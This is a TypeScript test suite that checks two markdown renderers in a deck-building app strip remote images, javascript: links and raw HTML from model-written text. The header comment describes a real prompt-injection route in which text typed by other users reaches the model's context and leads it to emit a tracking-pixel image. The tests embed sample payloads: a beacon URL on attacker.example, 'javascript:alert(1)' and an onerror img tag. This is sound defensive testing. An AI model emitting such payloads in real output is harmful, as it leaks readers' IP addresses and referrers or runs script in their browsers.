/**
 * What model-written markdown ACTUALLY renders to, rendered.
 *
 * `markdownSafety.test.ts` next door pins the URL predicate. This pins the
 * thing that matters to a reader: the HTML that comes out the other end of
 * `react-markdown` with our component maps applied. The two are not the same
 * test, and the gap between them is where a real vulnerability lived — the
 * predicate was never the problem, the DEFAULTS were, and a defaults bug is
 * invisible to any test that only exercises the code you wrote.
 *
 * ── THE ONE THAT WAS LIVE ────────────────────────────────────────────────────
 *
 * `routes/deck/MarkdownView.tsx` renders `strategyMd`, which Deck-E's own
 * `deck_strategy` tool writes. Its component map had no `img` entry, so
 * react-markdown's default applied and `![](https://attacker/p.gif)` in a
 * strategy guide became a real remote `<img>` — a tracking beacon that fires on
 * render and hands the reader's IP and referrer to whoever managed to get a
 * string into the model's context. Card text, deck descriptions and list names
 * are all in that context and all typed by other people.
 *
 * These tests render the real components through `react-dom/server` — no DOM
 * needed, which is why they can live in this suite — and assert on the output
 * string. An attacker's host name simply must not appear in it.
 */
import assert from 'node:assert/strict'
import { test } from 'node:test'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import MarkdownView from '../../../../routes/deck/MarkdownView'
import ChatMarkdownBody from '../ChatMarkdownBody'

const BEACON = 'https://attacker.example/pixel.gif?leak=1'

/** Both renderers, so a fix applied to one and not the other is caught. */
const SURFACES: [string, (md: string) => string][] = [
  ['deck strategy guide', (md) => renderToStaticMarkup(createElement(MarkdownView, { markdown: md }))],
  [
    'chat transcript',
    (md) =>
      renderToStaticMarkup(createElement(ChatMarkdownBody, { text: md, tone: 'transcript' as const })),
  ],
]

for (const [name, render] of SURFACES) {
  test(`${name}: an image the model wrote is never fetched`, () => {
    const html = render(`Here is my plan.\n\n![chart](${BEACON})`)
    assert.ok(
      !html.includes('attacker.example'),
      `the beacon URL reached the rendered output — a remote image in ${name} is a ` +
        'tracking pixel that fires on render. Output was:\n' + html,
    )
    assert.ok(!/<img/i.test(html), 'no <img> element may be emitted at all')
    // The reader should still be told something was there. Silently deleting it
    // hides the fact that the model tried, which is its own small dishonesty.
    assert.match(html, /chart/, 'the alt text should survive as visible text')
  })

  test(`${name}: a javascript: link does not survive as a link`, () => {
    const html = render('[press me](javascript:alert(1))')
    assert.ok(!html.includes('javascript:'), `a javascript: URL reached the output:\n${html}`)
    assert.match(html, /press me/, 'the link text should still be readable')
  })

  test(`${name}: raw HTML is shown, not parsed`, () => {
    // `rehype-raw` is deliberately not used, so this arrives as a text node.
    // Asserting it is ESCAPED rather than absent is the point: showing the
    // reader what the model actually wrote is honest, and equally safe.
    const html = render('<img src=x onerror="alert(1)">')
    assert.ok(!/<img/i.test(html), 'raw HTML must not become markup')
    assert.ok(html.includes('&lt;img'), `expected escaped text, got:\n${html}`)
  })

  test(`${name}: an ordinary https link is left alone`, () => {
    // The control. Every assertion above is satisfied by a renderer that emits
    // nothing at all, so one of these has to prove the renderer still works.
    const html = render('[the set](https://deckpal.app/series/mega-evolution)')
    assert.match(html, /https:\/\/deckpal\.app\/series\/mega-evolution/)
    assert.match(html, /rel="[^"]*noreferrer/, 'external links keep rel="noopener noreferrer"')
  })
}
